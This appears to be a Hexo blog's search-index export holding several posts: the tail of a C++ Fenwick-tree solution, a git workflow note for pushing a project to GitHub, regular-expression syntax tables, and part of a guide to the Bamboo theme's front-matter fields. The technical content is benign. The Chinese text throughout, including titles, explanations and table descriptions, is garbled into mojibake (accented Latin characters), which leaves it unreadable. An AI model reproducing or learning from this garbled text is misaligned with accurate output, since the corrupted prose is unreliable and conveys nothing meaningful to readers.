temp&#x3D;(right-left+1)*value;result+&#x3D;temp;update(left,temp);update(right+1,-temp);&#125;else &#123;ll pos;pos&#x3D;read();cout&lt;&lt;result-getsum(pos)&lt;&lt;endl;&#125; &#125;  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®ç»“æ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®ç»“æ„ </tag>
            
            <tag> æ ‘çŠ¶æ•°ç»„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºgithubæœ¬åœ°é¡¹ç›®æäº¤</title>
      <link href="/2022/03/22/guan-yu-github-ben-di-xiang-mu-ti-jiao/"/>
      <url>/2022/03/22/guan-yu-github-ben-di-xiang-mu-ti-jiao/</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><p><code>github</code>é¡¹ç›®æäº¤çš„æ­¥éª¤æ€»æ˜¯ä¼šå¿˜è®°ï¼Œæ‰€ä»¥å¼€ä¸€ç¯‡æ–‡ç« æ¥è®°å½•ä¸€ä¸‹ï¼Œä»…è®°å½•æœ€ç®€å•çš„ç¬¬ä¸€ç§æ–¹å¼ã€‚  </p><p>æŸ¥é˜…çš„æ–‡ç« ï¼š<a href="https://www.cnblogs.com/du-hong/p/9921214.html">Gitçš„ä½¿ç”¨â€“å¦‚ä½•å°†æœ¬åœ°é¡¹ç›®ä¸Šä¼ åˆ°Githubï¼ˆä¸‰ç§ç®€å•ã€æ–¹ä¾¿çš„æ–¹æ³•ï¼‰</a>  </p><h3 id="ç¬¬ä¸€ç§æ–¹å¼"><a href="#ç¬¬ä¸€ç§æ–¹å¼" class="headerlink" title="ç¬¬ä¸€ç§æ–¹å¼"></a>ç¬¬ä¸€ç§æ–¹å¼</h3><p>é¦–å…ˆæœ¬åœ°ä¸‹è½½å®‰è£…gitå·¥å…·  </p><p>ç™»å½•<code>github</code>ï¼Œ<code>new repository</code> æ–°å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®  </p><p>è®°å¾—æ–°å»ºå®Œé¡¹ç›®ä¹‹åï¼Œcopyä¸€ä¸‹<code>https</code>çš„é¡¹ç›®åœ°å€  </p><p>ç„¶åæ¥åˆ°æœ¬åœ°æ“ä½œï¼Œæ¥åˆ°é¡¹ç›®æ–‡ä»¶å¤¹ï¼Œå³é”®git bash here æ‰“å¼€å‘½ä»¤è¡Œ  </p><p><code>git clone é¡¹ç›®åç§°</code> æŠŠä»“åº“å…‹éš†åˆ°æœ¬åœ°ä¸Šé¢  </p><p>å†æŠŠè‡ªå·±é¡¹ç›®çš„æ‰€æœ‰æ–‡ä»¶copyåˆ°åˆšåˆšå»ºç«‹çš„ä»“åº“æ–‡ä»¶å¤¹  </p><p><code>cd</code>åˆ°ä»“åº“æ–‡ä»¶å¤¹  </p><p>æ¥ä¸‹æ¥ä¾æ¬¡è¾“å…¥ä¸€ä¸‹ä»£ç å³å¯å®Œæˆå‰©ä½™æ“ä½œï¼š  </p><p><code>git add *</code>  </p><p><code>git commit -m &quot;å¤‡æ³¨çš„æäº¤ä¿¡æ¯&quot;</code>  </p><p><code>git push -u origin mainï¼ˆè¿™ä¸ªæ˜¯ä½ åˆ†æ”¯çš„åç§°ï¼‰</code></p><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RegExpå­¦ä¹ </title>
      <link href="/2022/03/20/regexp-xue-xi/"/>
      <url>/2022/03/20/regexp-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>å…¶å®å¾ˆæ—©å°±æ¥è§¦<code>æ­£åˆ™è¡¨è¾¾å¼</code>äº†ï¼ŒçŸ¥è¯†ä¸€ç›´æ²¡æœ‰ç³»ç»Ÿå­¦ä¹ ï¼Œæ€»æ˜¯è®°äº†ä¸€éƒ¨åˆ†å°±ä¼šå¿˜è®°ï¼Œæ‰€ä»¥è¿™ä¸€æ¬¡è®°å½•ä¸€ä¸‹å­¦ä¹ çš„è¿‡ç¨‹ã€‚  å­¦ä¹ çš„ç½‘ç«™æ˜¯ï¼š<a href="https://www.runoob.com/regexp/regexp-syntax.html">èœé¸Ÿæ•™ç¨‹çš„æ­£åˆ™è¡¨è¾¾å¼æ•™å­¦</a>(æ‰€ä»¥å¯èƒ½éƒ½æ˜¯å¤åˆ¶ç²˜è´´ï¼Œç»å…¸CVå¤§æ³•hhhhh</p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><ul><li><strong>runoo+b</strong>ï¼Œå¯ä»¥åŒ¹é… <strong>runoobã€runooobã€runoooooob</strong> ç­‰ï¼Œ**+** å·ä»£è¡¨å‰é¢çš„å­—ç¬¦å¿…é¡»è‡³å°‘å‡ºç°ä¸€æ¬¡ï¼ˆ1æ¬¡æˆ–å¤šæ¬¡ï¼‰ã€‚</li><li><strong>runoo*b</strong>ï¼Œå¯ä»¥åŒ¹é… <strong>runobã€runoobã€runoooooob</strong> ç­‰ï¼Œ***** å·ä»£è¡¨å‰é¢çš„å­—ç¬¦å¯ä»¥ä¸å‡ºç°ï¼Œä¹Ÿå¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–è€…å¤šæ¬¡ï¼ˆ0æ¬¡ã€æˆ–1æ¬¡ã€æˆ–å¤šæ¬¡ï¼‰ã€‚</li><li><strong>colou?r</strong> å¯ä»¥åŒ¹é… <strong>color</strong> æˆ–è€… <strong>colour</strong>ï¼Œ**?** é—®å·ä»£è¡¨å‰é¢çš„å­—ç¬¦æœ€å¤šåªå¯ä»¥å‡ºç°ä¸€æ¬¡ï¼ˆ0æ¬¡æˆ–1æ¬¡ï¼‰ã€‚</li></ul><p><code>/[^aeiou]/</code>åŒ¹é…é™¤äº† <strong>[â€¦]</strong> ä¸­å­—ç¬¦çš„æ‰€æœ‰å­—ç¬¦ï¼Œä¾‹å¦‚ <strong>[^aeiou]</strong> åŒ¹é…å­—ç¬¦ä¸² â€œgoogle runoob taobaoâ€ ä¸­é™¤äº† e o u a å­—æ¯çš„æ‰€æœ‰å­—æ¯ã€‚  </p><p><code>/[A-Z]/g</code> è¡¨ç¤ºä¸€ä¸ªåŒºé—´ï¼ŒåŒ¹é…æ‰€æœ‰å¤§å†™å­—æ¯ï¼Œ[a-z] è¡¨ç¤ºæ‰€æœ‰å°å†™å­—æ¯ã€‚    </p><p><code>/./g</code>  åŒ¹é…é™¤æ¢è¡Œç¬¦<code>ï¼ˆ\nã€\rï¼‰</code>ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ï¼Œç›¸ç­‰äº<code> [^\n\r]</code>ã€‚  </p><p><code>/[\s\S]/g</code>  åŒ¹é…æ‰€æœ‰ã€‚<code>\s </code>æ˜¯åŒ¹é…æ‰€æœ‰ç©ºç™½ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œï¼Œ<code>\S </code>éç©ºç™½ç¬¦ï¼Œä¸åŒ…æ‹¬æ¢è¡Œã€‚  </p><p><code>/[\w]/</code>  åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº<code> [A-Za-z0-9_]</code>  </p><h4 id="ç‰¹æ®Šå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦</h4><table><thead><tr><th align="left">ç‰¹åˆ«å­—ç¬¦</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">$</td><td align="left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œåˆ™ $ ä¹ŸåŒ¹é… â€˜\nâ€™ æˆ– â€˜\râ€™ã€‚è¦åŒ¹é… $ å­—ç¬¦æœ¬èº«ï¼Œè¯·ä½¿ç”¨ $ã€‚</td></tr><tr><td align="left">( )</td><td align="left">æ ‡è®°ä¸€ä¸ªå­è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸä½ç½®ã€‚å­è¡¨è¾¾å¼å¯ä»¥è·å–ä¾›ä»¥åä½¿ç”¨ã€‚è¦åŒ¹é…è¿™äº›å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ ( å’Œ )ã€‚</td></tr><tr><td align="left">*</td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚è¦åŒ¹é… * å­—ç¬¦ï¼Œè¯·ä½¿ç”¨<code> \*</code>ã€‚</td></tr><tr><td align="left">+</td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚è¦åŒ¹é… + å­—ç¬¦ï¼Œè¯·ä½¿ç”¨ <code>\+</code>ã€‚</td></tr><tr><td align="left">.</td><td align="left">åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ã€‚è¦åŒ¹é… . ï¼Œè¯·ä½¿ç”¨<code>\.</code>ã€‚</td></tr><tr><td align="left">[</td><td align="left">æ ‡è®°ä¸€ä¸ªä¸­æ‹¬å·è¡¨è¾¾å¼çš„å¼€å§‹ã€‚è¦åŒ¹é… [ï¼Œè¯·ä½¿ç”¨<code> \[</code>ã€‚</td></tr><tr><td align="left">?</td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦ã€‚è¦åŒ¹é… ? å­—ç¬¦ï¼Œè¯·ä½¿ç”¨<code> \?</code>ã€‚</td></tr><tr><td align="left">\</td><td align="left">å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºæˆ–ç‰¹æ®Šå­—ç¬¦ã€æˆ–åŸä¹‰å­—ç¬¦ã€æˆ–å‘åå¼•ç”¨ã€æˆ–å…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜nâ€™ åŒ¹é…å­—ç¬¦ â€˜nâ€™ã€‚â€™\nâ€™ åŒ¹é…æ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\â€˜ åŒ¹é… â€œ&quot;ï¼Œè€Œ â€˜(â€˜ åˆ™åŒ¹é… â€œ(â€œã€‚</td></tr><tr><td align="left">^</td><td align="left"><strong>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼Œé™¤éåœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨ï¼Œå½“è¯¥ç¬¦å·åœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºä¸æ¥å—è¯¥æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­çš„å­—ç¬¦é›†åˆ</strong>ã€‚è¦åŒ¹é… ^ å­—ç¬¦æœ¬èº«ï¼Œè¯·ä½¿ç”¨ <code>\^</code>ã€‚</td></tr><tr><td align="left">{</td><td align="left">æ ‡è®°é™å®šç¬¦è¡¨è¾¾å¼çš„å¼€å§‹ã€‚è¦åŒ¹é… {ï¼Œè¯·ä½¿ç”¨<code> \&#123;</code>ã€‚</td></tr><tr><td align="left">|</td><td align="left">æŒ‡æ˜ä¸¤é¡¹ä¹‹é—´çš„ä¸€ä¸ªé€‰æ‹©ã€‚è¦åŒ¹é… |ï¼Œè¯·ä½¿ç”¨ <code>|</code>ã€‚</td></tr></tbody></table><h4 id="é™å®šç¬¦"><a href="#é™å®šç¬¦" class="headerlink" title="é™å®šç¬¦"></a>é™å®šç¬¦</h4><table><thead><tr><th align="left">å­—ç¬¦</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äº{0,}ã€‚</td></tr><tr><td align="left">+</td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äº {1,}ã€‚</td></tr><tr><td align="left">?</td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€do(es)?â€ å¯ä»¥åŒ¹é… â€œdoâ€ ã€ â€œdoesâ€ ä¸­çš„ â€œdoesâ€ ã€ â€œdoxyâ€ ä¸­çš„ â€œdoâ€ ã€‚? ç­‰ä»·äº {0,1}ã€‚</td></tr><tr><td align="left">{n}</td><td align="left">n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚</td></tr><tr><td align="left">{n,}</td><td align="left">n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äº â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äº â€˜o*â€™ã€‚</td></tr><tr><td align="left">{n,m}</td><td align="left">m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;&#x3D; mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äº â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</td></tr></tbody></table><h4 id="å®šä½ç¬¦"><a href="#å®šä½ç¬¦" class="headerlink" title="å®šä½ç¬¦"></a>å®šä½ç¬¦</h4><table><thead><tr><th align="left">å­—ç¬¦</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²å¼€å§‹çš„ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ^ è¿˜ä¼šä¸ \n æˆ– \r ä¹‹åçš„ä½ç½®åŒ¹é…ã€‚</td></tr><tr><td align="left">$</td><td align="left">åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²ç»“å°¾çš„ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ$ è¿˜ä¼šä¸ \n æˆ– \r ä¹‹å‰çš„ä½ç½®åŒ¹é…ã€‚</td></tr><tr><td align="left">\b</td><td align="left">åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œå³å­—ä¸ç©ºæ ¼é—´çš„ä½ç½®ã€‚</td></tr><tr><td align="left">\B</td><td align="left">éå•è¯è¾¹ç•ŒåŒ¹é…ã€‚</td></tr></tbody></table><h4 id="é€‰æ‹©"><a href="#é€‰æ‹©" class="headerlink" title="é€‰æ‹©"></a>é€‰æ‹©</h4><p>ç”¨åœ†æ‹¬å· <strong>()</strong> å°†æ‰€æœ‰é€‰æ‹©é¡¹æ‹¬èµ·æ¥ï¼Œç›¸é‚»çš„é€‰æ‹©é¡¹ä¹‹é—´ç”¨ <strong>|</strong> åˆ†éš”ã€‚  </p><p><strong>()</strong> è¡¨ç¤ºæ•è·åˆ†ç»„ï¼Œ**()** ä¼šæŠŠæ¯ä¸ªåˆ†ç»„é‡Œçš„åŒ¹é…çš„å€¼ä¿å­˜èµ·æ¥ï¼Œ å¤šä¸ªåŒ¹é…å€¼å¯ä»¥é€šè¿‡æ•°å­— n æ¥æŸ¥çœ‹(<strong>n</strong> æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬ n ä¸ªæ•è·ç»„çš„å†…å®¹)ã€‚  </p><p>ä½†ç”¨åœ†æ‹¬å·ä¼šæœ‰ä¸€ä¸ªå‰¯ä½œç”¨ï¼Œä½¿ç›¸å…³çš„åŒ¹é…ä¼šè¢«ç¼“å­˜ï¼Œæ­¤æ—¶å¯ç”¨ <strong>?:</strong> æ”¾åœ¨ç¬¬ä¸€ä¸ªé€‰é¡¹å‰æ¥æ¶ˆé™¤è¿™ç§å‰¯ä½œç”¨ã€‚</p><p>å…¶ä¸­ <strong>?:</strong> æ˜¯éæ•è·å…ƒä¹‹ä¸€ï¼Œè¿˜æœ‰ä¸¤ä¸ªéæ•è·å…ƒæ˜¯ <strong>?&#x3D;</strong> å’Œ **?!**ï¼Œè¿™ä¸¤ä¸ªè¿˜æœ‰æ›´å¤šçš„å«ä¹‰ï¼Œå‰è€…ä¸ºæ­£å‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•å¼€å§‹åŒ¹é…åœ†æ‹¬å·å†…çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„ä½ç½®æ¥åŒ¹é…æœç´¢å­—ç¬¦ä¸²ï¼Œåè€…ä¸ºè´Ÿå‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•å¼€å§‹ä¸åŒ¹é…è¯¥æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„ä½ç½®æ¥åŒ¹é…æœç´¢å­—ç¬¦ä¸²ã€‚</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/366574CC-3706-4B4C-8782-1BFF4CF57582.jpg" class="lazyload placeholder" data-srcset="https://www.runoob.com/wp-content/uploads/2014/03/366574CC-3706-4B4C-8782-1BFF4CF57582.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p> <code>exp1(?=exp2)</code>ï¼šæŸ¥æ‰¾ exp2 å‰é¢çš„ exp1ã€‚  </p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/reg-111.jpg" class="lazyload placeholder" data-srcset="https://www.runoob.com/wp-content/uploads/2014/03/reg-111.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="ä¿®é¥°ç¬¦"><a href="#ä¿®é¥°ç¬¦" class="headerlink" title="ä¿®é¥°ç¬¦"></a>ä¿®é¥°ç¬¦</h3><table><thead><tr><th align="left">ä¿®é¥°ç¬¦</th><th align="left">å«ä¹‰</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">i</td><td align="left">ignore - ä¸åŒºåˆ†å¤§å°å†™</td><td align="left">å°†åŒ¹é…è®¾ç½®ä¸ºä¸åŒºåˆ†å¤§å°å†™ï¼Œæœç´¢æ—¶ä¸åŒºåˆ†å¤§å°å†™: A å’Œ a æ²¡æœ‰åŒºåˆ«ã€‚</td></tr><tr><td align="left">g</td><td align="left">global - å…¨å±€åŒ¹é…</td><td align="left">æŸ¥æ‰¾æ‰€æœ‰çš„åŒ¹é…é¡¹ã€‚</td></tr><tr><td align="left">m</td><td align="left">multi line - å¤šè¡ŒåŒ¹é…</td><td align="left">ä½¿è¾¹ç•Œå­—ç¬¦ <strong>^</strong> å’Œ <strong>$</strong> åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œè®°ä½æ˜¯å¤šè¡Œï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ã€‚</td></tr><tr><td align="left">s</td><td align="left">ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ <strong>.</strong> ä¸­åŒ…å«æ¢è¡Œç¬¦ <strong>\n</strong></td><td align="left">é»˜è®¤æƒ…å†µä¸‹çš„åœ†ç‚¹ <strong>.</strong> æ˜¯ åŒ¹é…é™¤æ¢è¡Œç¬¦ <strong>\n</strong> ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ï¼ŒåŠ ä¸Š <strong>s</strong> ä¿®é¥°ç¬¦ä¹‹å, <strong>.</strong> ä¸­åŒ…å«æ¢è¡Œç¬¦ \nã€‚</td></tr></tbody></table><h3 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="å…ƒå­—ç¬¦"></a>å…ƒå­—ç¬¦</h3><table><thead><tr><th align="left">\d</th><th>åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº [0-9]ã€‚</th></tr></thead><tbody><tr><td align="left">\D</td><td>åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº <code>[^0-9]</code>ã€‚</td></tr><tr><td align="left">\f</td><td>åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº \x0c å’Œ \cLã€‚</td></tr><tr><td align="left">\n</td><td>åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº \x0a å’Œ \cJã€‚</td></tr><tr><td align="left">\r</td><td>åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº \x0d å’Œ \cMã€‚</td></tr><tr><td align="left">\s</td><td>åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº <code>[ \f\n\r\t\v]</code>ã€‚</td></tr><tr><td align="left">\S</td><td>åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº<code>[^ \f\n\r\t\v]</code>ã€‚</td></tr><tr><td align="left">\t</td><td>åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº \x09 å’Œ \cIã€‚</td></tr><tr><td align="left">\v</td><td>åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº \x0b å’Œ \cKã€‚</td></tr><tr><td align="left">\w</td><td>åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº<code>&#39;[A-Za-z0-9_]&#39;</code>ã€‚</td></tr><tr><td align="left">\W</td><td>åŒ¹é…éå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº<code> &#39;[^A-Za-z0-9_]&#39;</code>ã€‚</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> regexp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-bambooæ–‡ç« Front-matterä»‹ç»</title>
      <link href="/2022/03/20/hexo-bamboo-wen-zhang-front-matter-jie-shao/"/>
      <url>/2022/03/20/hexo-bamboo-wen-zhang-front-matter-jie-shao/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ç« Front-matterä»‹ç»"><a href="#æ–‡ç« Front-matterä»‹ç»" class="headerlink" title="æ–‡ç« Front-matterä»‹ç»"></a>æ–‡ç« Front-matterä»‹ç»</h1><p>è¿™ä¸ªfront-matteræŒ‡çš„å°±æ˜¯ä½ æ–‡ç« å†™åœ¨æœ€å‰é¢çš„é‚£äº›å‚æ•°ï¼Œåªé’ˆå¯¹è¿™ç¯‡æ–‡ç« ï¼Œä¸‹é¢çš„æ˜¯hexoä¸»é¢˜bambooçš„å‚æ•°ï¼Œå¦‚ä¸‹ï¼š  </p><pre class="line-numbers language-none"><code class="language-none">---title: Hexoä¸»é¢˜--Bambooä»‹ç»date: 2020-09-14 14:06swiper: true # å°†è¯¥æ–‡ç« æ”¾å…¥è½®æ’­å›¾ä¸­swiperImg: &#39;&#x2F;medias&#x2F;1.jpg&#39; # è¯¥æ–‡ç« åœ¨è½®æ’­å›¾ä¸­çš„å›¾ç‰‡ï¼Œå¯ä»¥æ˜¯æœ¬åœ°ç›®å½•ä¸‹å›¾ç‰‡ä¹Ÿå¯ä»¥æ˜¯http:&#x2F;&#x2F;xxxå›¾ç‰‡swiperDesc: &#39;æ–‡ç« çš„front-matterç¼–è¾‘&#39;img: &#39;&#x2F;medias&#x2F;1.jpg&#39; # è¯¥æ–‡ç« å›¾ç‰‡ï¼Œå¯ä»¥æ˜¯æœ¬åœ°ç›®å½•ä¸‹å›¾ç‰‡ä¹Ÿå¯ä»¥æ˜¯http:&#x2F;&#x2F;xxxå›¾ç‰‡categories: å‰ç«¯tags: [Hexo, hexo-theme-bamboo]top: true---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Front-matter</code> é€‰é¡¹ä¸­çš„æ‰€æœ‰å†…å®¹å‡ä¸º<strong>éå¿…å¡«</strong>çš„ã€‚ä½†æˆ‘ä»ç„¶å»ºè®®è‡³å°‘å¡«å†™ <code>title</code> å’Œ <code>date</code> çš„å€¼ã€‚</p><table><thead><tr><th align="left">é…ç½®é€‰é¡¹</th><th align="left">é»˜è®¤å€¼</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">title</td><td align="left"><code>Markdown</code> çš„æ–‡ä»¶æ ‡é¢˜</td><td align="left">æ–‡ç« æ ‡é¢˜ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹</td></tr><tr><td align="left">date</td><td align="left">æ–‡ä»¶åˆ›å»ºæ—¶çš„æ—¥æœŸæ—¶é—´</td><td align="left">å‘å¸ƒæ—¶é—´ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹ï¼Œä¸”æœ€å¥½ä¿è¯å…¨å±€å”¯ä¸€</td></tr><tr><td align="left">swiper</td><td align="left">false</td><td align="left">è¡¨ç¤ºè¯¥æ–‡ç« æ˜¯å¦éœ€è¦åŠ å…¥åˆ°é¦–é¡µè½®æ’­å°é¢ä¸­</td></tr><tr><td align="left">swiperImg</td><td align="left">æ— </td><td align="left">è¡¨ç¤ºè¯¥æ–‡ç« åœ¨é¦–é¡µè½®æ’­å°é¢éœ€è¦æ˜¾ç¤ºçš„å›¾ç‰‡è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é»˜è®¤ä½¿ç”¨æ–‡ç« çš„ç‰¹è‰²å›¾ç‰‡</td></tr><tr><td align="left">swiperDesc</td><td align="left">æ— </td><td align="left">è¡¨ç¤ºè¯¥æ–‡ç« åœ¨é¦–é¡µè½®æ’­å°é¢éœ€è¦æ˜¾ç¤ºçš„æ–‡å­—æè¿°ï¼ˆæ‘˜è¦ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™ä½¿ç”¨<code>excerpt</code>ï¼Œå¦‚æœ<code>excerpt</code>ä¹Ÿæ²¡æœ‰ï¼Œåˆ™å–æ–‡ç« å†…å®¹</td></tr><tr><td align="left">img</td><td align="left">æ— </td><td align="left">æ–‡ç« ç‰¹å¾å›¾ï¼Œè¯¥æ–‡ç« 